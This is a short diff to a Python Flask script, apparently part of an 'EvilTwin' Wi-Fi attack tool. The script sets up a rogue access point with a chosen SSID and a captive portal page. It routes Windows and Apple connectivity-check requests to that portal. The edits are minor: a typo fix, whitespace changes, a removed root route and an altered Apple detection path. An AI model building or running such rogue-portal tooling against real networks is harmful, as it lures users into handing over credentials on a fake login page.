@@ -6,7 +6,7 @@ import sys
 import textwrap
 import subprocess
 from flask import Flask, render_template
-from EvilTwin_info import selected_options
+from EvilTwin_info import selected_options  
 
 
 
@@ -18,12 +18,14 @@ def cmd(comand, ignore_error = False): # ignore_error so the script dont fail if
           sys.exit(1)
     return result     
 
-#Configruration
+#Configuration
 PORTAL_IP = "192.168.4.1"
 IFACE_INTERNET = "wlan1"
 IFACE_AP = selected_options['WLAN']
 WIFI_SSID = selected_options["SSID"]
 PORTAL = selected_options["PORTAL"]
+
+
 
 def configure_iptables():
     rule = [
@@ -92,9 +94,6 @@ app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))
 def show_portal():
     return render_template(PORTAL)
 
-@app.route("/")
-def index():
-    return show_portal()
 
 # Windows captive portal detection requests
 @app.route("/connecttest.txt")
@@ -103,7 +102,7 @@ def windows_captive_test():
     return show_portal()
 
 #Apple captive portal detection requests
-@app.route("/hotspot-detect.html") 
+@app.route("/captive.apple.com/hotspot-detect.html") 
 def apple_captive_test():
     return show_portal()
 
